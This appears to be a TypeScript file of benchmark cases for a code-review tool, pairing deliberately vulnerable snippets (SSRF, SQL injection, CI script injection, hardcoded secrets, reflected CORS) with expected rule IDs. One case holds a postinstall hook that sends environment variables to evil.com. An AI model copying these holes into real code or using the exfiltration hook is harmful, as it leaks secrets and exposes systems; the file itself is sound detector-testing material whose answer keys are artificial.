/**
 * Benchmark cases addressing coverage gaps identified in the April 2026 audit.
 *
 * Adds:
 * - 15 missing real-world attack patterns (vulnerable + clean pairs)
 * - 5 uncovered judge prefix cases (INTENT, MFPR, COH, OVER, FPR)
 * - Expanded Go coverage (10 → 25+)
 * - Expanded thin categories (supply-chain, compatibility, sovereignty)
 */

import type { BenchmarkCase } from "./benchmark.js";

export const BENCHMARK_COVERAGE_GAPS: BenchmarkCase[] = [
  // ═══════════════════════════════════════════════════════════════════════════
  // MISSING REAL-WORLD ATTACK PATTERNS
  // ═══════════════════════════════════════════════════════════════════════════

  // ── GraphQL Depth Attack ──
  {
    id: "graphql-query-depth-attack",
    description: "GraphQL query with no depth limit allows nested resource exhaustion",
    language: "typescript",
    code: `import { ApolloServer } from "@apollo/server";
import { startStandaloneServer } from "@apollo/server/standalone";

const typeDefs = \`
  type User { id: ID!, name: String, friends: [User] }
  type Query { user(id: ID!): User }
\`;

const resolvers = {
  Query: { user: (_, { id }) => db.findUser(id) },
  User: { friends: (user) => db.findFriends(user.id) },
};

const server = new ApolloServer({ typeDefs, resolvers });
startStandaloneServer(server, { listen: { port: 4000 } });`,
    expectedRuleIds: ["RATE-001", "PERF-001", "SEC-001"],
    acceptablePrefixes: ["SCALE", "REL", "API"],
    category: "rate-limiting",
    difficulty: "medium",
  },

  // ── WebSocket Authentication ──
  {
    id: "websocket-no-auth",
    description: "WebSocket server accepts connections without authentication",
    language: "typescript",
    code: `import { WebSocketServer } from "ws";

const wss = new WebSocketServer({ port: 8080 });

wss.on("connection", (ws) => {
  ws.on("message", (data) => {
    const msg = JSON.parse(data.toString());
    if (msg.type === "chat") {
      wss.clients.forEach((client) => client.send(JSON.stringify(msg)));
    }
    if (msg.type === "admin") {
      db.query("DELETE FROM messages WHERE id = " + msg.id);
    }
  });
});`,
    expectedRuleIds: ["AUTH-001", "SEC-001", "CYBER-001"],
    acceptablePrefixes: ["RATE", "ERR"],
    category: "auth",
    difficulty: "medium",
  },

  // ── JWT Key Rotation ──
  {
    id: "jwt-no-key-rotation",
    description: "JWT signing with static secret and no key rotation mechanism",
    language: "typescript",
    code: `import jwt from "jsonwebtoken";

const SECRET = "my-super-secret-key-that-never-changes";

export function issueToken(userId: string): string {
  return jwt.sign({ sub: userId, role: "user" }, SECRET, { expiresIn: "30d" });
}

export function verifyToken(token: string): any {
  return jwt.verify(token, SECRET);
}`,
    expectedRuleIds: ["AUTH-001", "CYBER-001"],
    acceptablePrefixes: ["SEC", "DATA", "CFG"],
    category: "auth",
    difficulty: "medium",
  },

  // ── Rate Limit Bypass via Headers ──
  {
    id: "rate-limit-header-bypass",
    description: "Rate limiter trusts X-Forwarded-For header allowing bypass",
    language: "typescript",
    code: `import express from "express";
import rateLimit from "express-rate-limit";

const app = express();

app.set("trust proxy", true);

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  keyGenerator: (req) => req.headers["x-forwarded-for"] as string || req.ip,
});

app.use(limiter);
app.post("/api/login", (req, res) => {
  // attacker can rotate X-Forwarded-For to bypass rate limit
  authenticate(req.body);
});`,
    expectedRuleIds: ["RATE-001", "SEC-001"],
    acceptablePrefixes: ["AUTH", "CYBER"],
    category: "rate-limiting",
    difficulty: "hard",
  },

  // ── SSRF → Cloud Metadata ──
  {
    id: "ssrf-cloud-metadata",
    description: "SSRF allowing access to cloud metadata endpoint",
    language: "typescript",
    code: `import express from "express";
import fetch from "node-fetch";

const app = express();

app.get("/proxy", async (req, res) => {
  const targetUrl = req.query.url as string;
  if (!targetUrl) return res.status(400).json({ error: "url required" });

  try {
    const response = await fetch(targetUrl);
    const body = await response.text();
    res.send(body);
  } catch (err) {
    res.status(500).json({ error: "fetch failed" });
  }
});`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    acceptablePrefixes: ["AUTH", "DATA"],
    category: "security",
    difficulty: "medium",
  },

  // ── Supply Chain Typosquatting ──
  {
    id: "supply-chain-typosquat-deps",
    description: "Package.json with typosquatted dependency names",
    language: "json",
    code: `{
  "name": "my-app",
  "dependencies": {
    "expresss": "^4.18.0",
    "loadash": "^4.17.0",
    "axois": "^1.6.0",
    "react-router-dmo": "^6.0.0",
    "cors": "^2.8.5"
  }
}`,
    expectedRuleIds: ["DEPS-001", "HALLU-001"],
    acceptablePrefixes: ["SEC", "CYBER"],
    category: "supply-chain",
    difficulty: "medium",
  },

  // ── Insecure Random Token ──
  {
    id: "insecure-random-session-token",
    description: "Math.random() used to generate session tokens",
    language: "typescript",
    code: `export function generateSessionToken(): string {
  let token = "";
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (let i = 0; i < 32; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

export function generateResetToken(): string {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}`,
    expectedRuleIds: ["CYBER-001", "SEC-001", "AUTH-001"],
    category: "security",
    difficulty: "easy",
  },

  // ── Log Injection ──
  {
    id: "log-injection-user-input",
    description: "User input written directly to logs enabling log injection",
    language: "typescript",
    code: `import express from "express";
import { createLogger } from "winston";

const logger = createLogger({ level: "info" });
const app = express();

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  logger.info("Login attempt for user: " + username);
  if (!authenticate(username, password)) {
    logger.warn("Failed login for: " + username + " from IP: " + req.ip);
    return res.status(401).json({ error: "Invalid credentials" });
  }
  logger.info("Successful login: " + username);
  res.json({ token: generateToken(username) });
});`,
    expectedRuleIds: ["LOGPRIV-001", "SEC-001"],
    acceptablePrefixes: ["CYBER", "AUTH"],
    category: "logging-privacy",
    difficulty: "medium",
  },

  // ── K8s RBAC Wildcard ──
  {
    id: "k8s-rbac-wildcard-permissions",
    description: "Kubernetes ClusterRole with wildcard permissions",
    language: "yaml",
    code: `apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: app-admin
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: app-admin-binding
subjects:
  - kind: ServiceAccount
    name: app-service
    namespace: default
roleRef:
  kind: ClusterRole
  name: app-admin
  apiGroup: rbac.authorization.k8s.io`,
    expectedRuleIds: ["IAC-001", "SEC-001"],
    acceptablePrefixes: ["CYBER", "AUTH", "CLOUD"],
    category: "iac-security",
    difficulty: "easy",
  },

  // ── Terraform State Secrets ──
  {
    id: "terraform-state-with-secrets",
    description: "Terraform configuration storing secrets in state file",
    language: "hcl",
    code: `resource "aws_db_instance" "main" {
  engine         = "postgres"
  instance_class = "db.t3.micro"
  username       = "admin"
  password       = "SuperSecret123!"

  tags = {
    Environment = "production"
  }
}

resource "aws_secretsmanager_secret_version" "db_password" {
  secret_id     = aws_secretsmanager_secret.db.id
  secret_string = "SuperSecret123!"
}

output "db_password" {
  value     = aws_db_instance.main.password
  sensitive = false
}`,
    expectedRuleIds: ["IAC-001", "AUTH-001"],
    acceptablePrefixes: ["SEC", "CYBER", "DATA", "CFG"],
    category: "iac-security",
    difficulty: "easy",
  },

  // ── CI Script Injection ──
  {
    id: "ci-script-injection-pr-title",
    description: "GitHub Actions workflow vulnerable to script injection via PR title",
    language: "yaml",
    code: `name: PR Comment
on:
  pull_request:
    types: [opened, edited]

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on PR
        run: |
          echo "Processing PR: $\{{ github.event.pull_request.title }}"
          curl -X POST -H "Authorization: token $\{{ secrets.GITHUB_TOKEN }}" \\
            -d '{"body": "Reviewed: $\{{ github.event.pull_request.title }}"}' \\
            "$\{{ github.api_url }}/repos/$\{{ github.repository }}/issues/$\{{ github.event.number }}/comments"`,
    expectedRuleIds: ["CICD-001", "SEC-001"],
    acceptablePrefixes: ["CYBER", "IAC"],
    category: "ci-cd",
    difficulty: "hard",
  },

  // ── OAuth Missing State ──
  {
    id: "oauth-missing-state-param",
    description: "OAuth flow without state parameter for CSRF protection",
    language: "typescript",
    code: `import express from "express";

const app = express();
const CLIENT_ID = process.env.OAUTH_CLIENT_ID;
const CLIENT_SECRET = process.env.OAUTH_CLIENT_SECRET;

app.get("/auth/login", (req, res) => {
  res.redirect(\`https://provider.com/oauth/authorize?client_id=\${CLIENT_ID}&redirect_uri=http://localhost:3000/auth/callback&response_type=code\`);
});

app.get("/auth/callback", async (req, res) => {
  const { code } = req.query;
  const tokenRes = await fetch("https://provider.com/oauth/token", {
    method: "POST",
    body: JSON.stringify({ code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET }),
  });
  const { access_token } = await tokenRes.json();
  req.session.token = access_token;
  res.redirect("/dashboard");
});`,
    expectedRuleIds: ["AUTH-001", "CYBER-001"],
    acceptablePrefixes: ["SEC", "FW"],
    category: "auth",
    difficulty: "medium",
  },

  // ── CORS Credentials + Wildcard ──
  {
    id: "cors-credentials-wildcard-origin",
    description: "CORS configured with credentials and reflected origin",
    language: "typescript",
    code: `import express from "express";
import cors from "cors";

const app = express();

app.use(cors({
  origin: (origin, callback) => {
    callback(null, origin);
  },
  credentials: true,
}));

app.get("/api/user", (req, res) => {
  res.json({ user: req.session.user, email: req.session.email });
});`,
    expectedRuleIds: ["SEC-001", "CYBER-001"],
    acceptablePrefixes: ["AUTH", "DATA", "FW"],
    category: "security",
    difficulty: "hard",
  },

  // ── Hardcoded Encryption Key ──
  {
    id: "hardcoded-encryption-key-aes",
    description: "AES encryption key hardcoded in source",
    language: "typescript",
    code: `import crypto from "crypto";

const ENCRYPTION_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";
const IV_LENGTH = 16;

export function encrypt(text: string): string {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString("hex") + ":" + encrypted.toString("hex");
}

export function decrypt(text: string): string {
  const parts = text.split(":");
  const iv = Buffer.from(parts[0], "hex");
  const encrypted = Buffer.from(parts[1], "hex");
  const decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(ENCRYPTION_KEY), iv);
  let decrypted = decipher.update(encrypted);
  decrypted = Buffer.concat([decrypted, decipher.final()]);
  return decrypted.toString();
}`,
    expectedRuleIds: ["AUTH-001", "CYBER-001", "DATA-001"],
    acceptablePrefixes: ["SEC", "CFG"],
    category: "security",
    difficulty: "easy",
  },

  // ── DNS Rebinding ──
  {
    id: "dns-rebinding-ssrf-bypass",
    description: "SSRF check vulnerable to DNS rebinding attack",
    language: "typescript",
    code: `import dns from "dns/promises";
import fetch from "node-fetch";

async function isInternalIP(hostname: string): Promise<boolean> {
  const { address } = await dns.lookup(hostname);
  return address.startsWith("10.") || address.startsWith("192.168.") || address === "127.0.0.1";
}

export async function safeFetch(url: string): Promise<string> {
  const parsed = new URL(url);

  if (await isInternalIP(parsed.hostname)) {
    throw new Error("Internal IPs not allowed");
  }

  // DNS rebinding: hostname now resolves to a different IP
  const response = await fetch(url);
  return response.text();
}`,
    expectedRuleIds: ["CYBER-001", "SEC-001"],
    acceptablePrefixes: ["AUTH"],
    category: "security",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // UNCOVERED JUDGE PREFIX CASES
  // ═══════════════════════════════════════════════════════════════════════════

  // ── INTENT: Code-comment alignment ──
  {
    id: "intent-misleading-function-name",
    description: "Function name suggests deletion but actually archives",
    language: "typescript",
    code: `export async function deleteUser(userId: string): Promise<void> {
  // "Delete" user — actually just marks as inactive
  await db.users.update({ id: userId }, { active: false, deletedAt: new Date() });
  await cache.invalidate(\`user:\${userId}\`);
  await emailService.send(userId, "Your account has been deleted");
}

export function validateEmail(input: string): boolean {
  // Validates phone number format
  return /^\\+?[1-9]\\d{1,14}$/.test(input);
}`,
    expectedRuleIds: ["INTENT-001"],
    acceptablePrefixes: ["DOC", "LOGIC", "MAINT"],
    category: "intent-alignment",
    difficulty: "medium",
  },

  // ── OVER: Over-engineering ──
  {
    id: "over-engineering-simple-task",
    description: "Massively over-engineered solution for simple string formatting",
    language: "typescript",
    code: `// Abstract factory for string formatters
interface IFormatterStrategy { format(input: string): string; }
interface IFormatterFactory { create(type: string): IFormatterStrategy; }

class UpperCaseStrategy implements IFormatterStrategy {
  format(input: string): string { return input.toUpperCase(); }
}
class LowerCaseStrategy implements IFormatterStrategy {
  format(input: string): string { return input.toLowerCase(); }
}
class TitleCaseStrategy implements IFormatterStrategy {
  format(input: string): string { return input.replace(/\\b\\w/g, c => c.toUpperCase()); }
}

class FormatterFactory implements IFormatterFactory {
  private registry = new Map<string, new () => IFormatterStrategy>();
  constructor() {
    this.registry.set("upper", UpperCaseStrategy);
    this.registry.set("lower", LowerCaseStrategy);
    this.registry.set("title", TitleCaseStrategy);
  }
  create(type: string): IFormatterStrategy {
    const Ctor = this.registry.get(type);
    if (!Ctor) throw new Error("Unknown formatter: " + type);
    return new Ctor();
  }
}

class FormatterService {
  constructor(private factory: IFormatterFactory) {}
  execute(input: string, type: string): string {
    return this.factory.create(type).format(input);
  }
}

// Usage: new FormatterService(new FormatterFactory()).execute("hello", "upper")
// Could be: "hello".toUpperCase()`,
    expectedRuleIds: ["OVER-001"],
    acceptablePrefixes: ["MAINT", "STRUCT", "SWDEV"],
    category: "over-engineering",
    difficulty: "easy",
  },

  // ── COH: Code coherence ──
  {
    id: "coherence-mixed-patterns",
    description: "File mixing async/await, callbacks, and .then() inconsistently",
    language: "typescript",
    code: `import fs from "fs";
import { promisify } from "util";

const readFile = promisify(fs.readFile);

// Callback style
export function loadConfig(path: string, cb: (err: Error | null, data?: any) => void) {
  fs.readFile(path, "utf8", (err, data) => {
    if (err) return cb(err);
    cb(null, JSON.parse(data));
  });
}

// Promise .then() style
export function loadUsers() {
  return readFile("users.json", "utf8").then(data => {
    return JSON.parse(data);
  }).then(users => {
    return users.filter((u: any) => u.active);
  });
}

// async/await style
export async function loadPermissions(): Promise<string[]> {
  const data = await readFile("permissions.json", "utf8");
  const perms = JSON.parse(data);
  return perms.map((p: any) => p.name);
}

// Mixed in one function
export function processData(path: string) {
  return new Promise((resolve, reject) => {
    fs.readFile(path, "utf8", async (err, data) => {
      if (err) return reject(err);
      const parsed = JSON.parse(data);
      const enriched = await enrichData(parsed);
      resolve(enriched);
    });
  });
}`,
    expectedRuleIds: ["COH-001"],
    acceptablePrefixes: ["MAINT", "SWDEV", "STRUCT", "ERR"],
    category: "code-structure",
    difficulty: "medium",
  },

  // ── MFPR: AI code provenance ──
  {
    id: "mfpr-ai-generated-markers",
    description: "Code with typical AI-generated patterns and placeholder comments",
    language: "typescript",
    code: `// Generated by AI Assistant
// TODO: Implement proper error handling
// TODO: Add input validation
// TODO: Replace with production database connection

import express from "express";

const app = express();

// Simple CRUD API
app.get("/api/items", async (req, res) => {
  // Fetch all items from the database
  const items = await db.query("SELECT * FROM items");
  res.json(items);
});

app.post("/api/items", async (req, res) => {
  // Insert new item
  const { name, price } = req.body;
  // Note: Add validation here
  await db.query(\`INSERT INTO items (name, price) VALUES ('\${name}', \${price})\`);
  res.status(201).json({ message: "Created" });
});

// Start server
app.listen(3000, () => console.log("Server running on port 3000"));
// End of generated code`,
    expectedRuleIds: ["MFPR-001", "AICS-001"],
    acceptablePrefixes: ["SEC", "CYBER", "AUTH", "ERR", "DOC"],
    category: "ai-code-safety",
    difficulty: "easy",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // EXPANDED GO COVERAGE
  // ═══════════════════════════════════════════════════════════════════════════

  {
    id: "go-goroutine-leak-channel",
    description: "Go goroutine leak from unbuffered channel never read",
    language: "go",
    code: `package main

import (
    "fmt"
    "net/http"
)

func handler(w http.ResponseWriter, r *http.Request) {
    ch := make(chan string)
    go func() {
        result := fetchFromAPI(r.URL.Query().Get("id"))
        ch <- result // blocks forever if handler returns early
    }()

    select {
    case res := <-ch:
        fmt.Fprint(w, res)
    case <-r.Context().Done():
        // goroutine still blocked on ch <- result
        http.Error(w, "timeout", http.StatusGatewayTimeout)
    }
}`,
    expectedRuleIds: ["CONC-001", "REL-001"],
    acceptablePrefixes: ["PERF", "SCALE"],
    category: "concurrency",
    difficulty: "hard",
  },

  {
    id: "go-http-no-timeout",
    description: "Go HTTP server with no read/write timeouts",
    language: "go",
    code: `package main

import (
    "fmt"
    "net/http"
)

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/api/data", dataHandler)

    server := &http.Server{
        Addr:    ":8080",
        Handler: mux,
    }

    fmt.Println("Starting server on :8080")
    server.ListenAndServe()
}

func dataHandler(w http.ResponseWriter, r *http.Request) {
    data := fetchExpensiveData()
    fmt.Fprint(w, data)
}`,
    expectedRuleIds: ["REL-001", "SCALE-001"],
    acceptablePrefixes: ["RATE", "PERF", "SEC"],
    category: "reliability",
    difficulty: "medium",
  },

  {
    id: "go-sql-prepared-missing",
    description: "Go database queries without prepared statements",
    language: "go",
    code: `package main

import (
    "database/sql"
    "fmt"
    "net/http"
    _ "github.com/lib/pq"
)

var db *sql.DB

func searchHandler(w http.ResponseWriter, r *http.Request) {
    term := r.URL.Query().Get("q")
    query := fmt.Sprintf("SELECT * FROM products WHERE name LIKE '%%%s%%'", term)
    rows, err := db.Query(query)
    if err != nil {
        http.Error(w, err.Error(), 500)
        return
    }
    defer rows.Close()
    // process rows...
}`,
    expectedRuleIds: ["CYBER-001", "SEC-001", "DB-001"],
    acceptablePrefixes: ["AUTH"],
    category: "injection",
    difficulty: "easy",
  },

  {
    id: "go-context-not-propagated",
    description: "Go HTTP handler not propagating context to downstream calls",
    language: "go",
    code: `package main

import (
    "encoding/json"
    "net/http"
    "time"
)

func getUserHandler(w http.ResponseWriter, r *http.Request) {
    id := r.URL.Query().Get("id")

    // Context from request not passed to downstream calls
    user, err := fetchUser(id)
    if err != nil {
        http.Error(w, "internal error", 500)
        return
    }

    orders, err := fetchOrders(id)
    if err != nil {
        http.Error(w, "internal error", 500)
        return
    }

    json.NewEncoder(w).Encode(map[string]interface{}{"user": user, "orders": orders})
}

func fetchUser(id string) (interface{}, error) {
    time.Sleep(5 * time.Second) // simulates slow call
    return nil, nil
}

func fetchOrders(id string) (interface{}, error) {
    time.Sleep(5 * time.Second)
    return nil, nil
}`,
    expectedRuleIds: ["REL-001"],
    acceptablePrefixes: ["PERF", "SCALE", "CONC"],
    category: "reliability",
    difficulty: "medium",
  },

  {
    id: "go-error-string-comparison",
    description: "Go code comparing errors by string instead of errors.Is/As",
    language: "go",
    code: `package main

import (
    "database/sql"
    "errors"
    "fmt"
    "net/http"
)

func getItem(w http.ResponseWriter, r *http.Request) {
    item, err := db.QueryRow("SELECT * FROM items WHERE id = $1", r.URL.Query().Get("id"))
    if err != nil {
        if err.Error() == "sql: no rows in result set" {
            http.Error(w, "not found", 404)
            return
        }
        if fmt.Sprintf("%v", err) == "connection refused" {
            http.Error(w, "service unavailable", 503)
            return
        }
        http.Error(w, "internal error", 500)
        return
    }
    _ = item
}

var _ = errors.Is // imported but not used for error checks
var _ = sql.ErrNoRows`,
    expectedRuleIds: ["ERR-001", "SWDEV-001"],
    acceptablePrefixes: ["LOGIC", "MAINT", "REL"],
    category: "error-handling",
    difficulty: "medium",
  },

  // ── Clean Go ──
  {
    id: "clean-go-context-propagation",
    description: "Go handler properly propagating context with timeouts",
    language: "go",
    code: `package main

import (
    "context"
    "encoding/json"
    "log"
    "net/http"
    "time"
)

func getUserHandler(w http.ResponseWriter, r *http.Request) {
    ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
    defer cancel()

    id := r.URL.Query().Get("id")
    if id == "" {
        http.Error(w, "id required", http.StatusBadRequest)
        return
    }

    user, err := fetchUser(ctx, id)
    if err != nil {
        log.Printf("fetchUser error: %v", err)
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }

    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(user)
}

func fetchUser(ctx context.Context, id string) (map[string]string, error) {
    row := db.QueryRowContext(ctx, "SELECT id, name, email FROM users WHERE id = $1", id)
    var user struct{ ID, Name, Email string }
    if err := row.Scan(&user.ID, &user.Name, &user.Email); err != nil {
        return nil, fmt.Errorf("scan user: %w", err)
    }
    return map[string]string{"id": user.ID, "name": user.Name, "email": user.Email}, nil
}`,
    expectedRuleIds: [],
    category: "clean",
    difficulty: "hard",
  },

  // ═══════════════════════════════════════════════════════════════════════════
  // EXPANDED THIN CATEGORIES
  // ═══════════════════════════════════════════════════════════════════════════

  // ── Supply Chain ──
  {
    id: "supply-chain-postinstall-script",
    description: "Package.json with suspicious postinstall script",
    language: "json",
    code: `{
  "name": "helpful-utils",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \\"require('child_process').exec('curl https://evil.com/collect?data='+encodeURIComponent(JSON.stringify({cwd:process.cwd(),env:process.env})))\\"",
    "build": "tsc"
  },
  "dependencies": {
    "express": "^4.18.0"
  }
}`,
    expectedRuleIds: ["DEPS-001", "SEC-001"],
    acceptablePrefixes: ["CYBER", "CICD"],
    category: "supply-chain",
    difficulty: "medium",
  },

  // ── Compatibility ──
  {
    id: "compat-api-field-type-change",
    description: "API response changes field type from string to object (breaking)",
    language: "typescript",
    code: `// v1 response: { user: "john" }
// v2 response: { user: { name: "john", id: 123 } }
// No versioning, no deprecation notice

export interface UserResponseV2 {
  user: { name: string; id: number }; // was: user: string
  metadata: { version: 2 };
}

export function getUser(id: string): UserResponseV2 {
  const user = db.findUser(id);
  return {
    user: { name: user.name, id: user.id },
    metadata: { version: 2 },
  };
}`,
    expectedRuleIds: ["COMPAT-001"],
    acceptablePrefixes: ["API", "DOC"],
    category: "compatibility",
    difficulty: "medium",
  },

  // ── Sovereignty ──
  {
    id: "sovereignty-analytics-third-party-transfer",
    description: "User data sent to third-party analytics without consent or transfer safeguards",
    language: "typescript",
    code: `import analytics from "analytics-provider";

export function trackUserActivity(user: { id: string; email: string; country: string }) {
  // Send full user profile to US-based analytics service
  analytics.track({
    userId: user.id,
    email: user.email,
    country: user.country,
    properties: {
      lastLogin: new Date().toISOString(),
      ipAddress: getClientIP(),
      browserFingerprint: generateFingerprint(),
    },
  });
}

export function trackPurchase(user: { id: string; email: string }, amount: number) {
  analytics.track({
    userId: user.id,
    email: user.email,
    event: "purchase",
    properties: { amount, currency: "EUR" },
  });
}`,
    expectedRuleIds: ["SOV-001", "COMP-001", "DATA-001"],
    acceptablePrefixes: ["LOGPRIV", "ETHICS"],
    category: "data-sovereignty",
    difficulty: "medium",
  },

  {
    id: "sovereignty-backup-no-region-constraint",
    description: "Database backups stored without region constraints",
    language: "hcl",
    code: `resource "aws_db_instance" "main" {
  engine               = "postgres"
  instance_class       = "db.r5.large"
  allocated_storage    = 100
  storage_encrypted    = true
  
  backup_retention_period = 30
  # No backup region constraint — backups may replicate to any AWS region
}

resource "aws_s3_bucket" "backups" {
  bucket = "company-db-backups"
  # No bucket policy restricting region
  # No replication configuration
}

resource "aws_s3_bucket_versioning" "backups" {
  bucket = aws_s3_bucket.backups.id
  versioning_configuration {
    status = "Enabled"
  }
}`,
    expectedRuleIds: ["SOV-001", "IAC-001"],
    acceptablePrefixes: ["DATA", "COMP", "CLOUD"],
    category: "data-sovereignty",
    difficulty: "hard",
  },
];
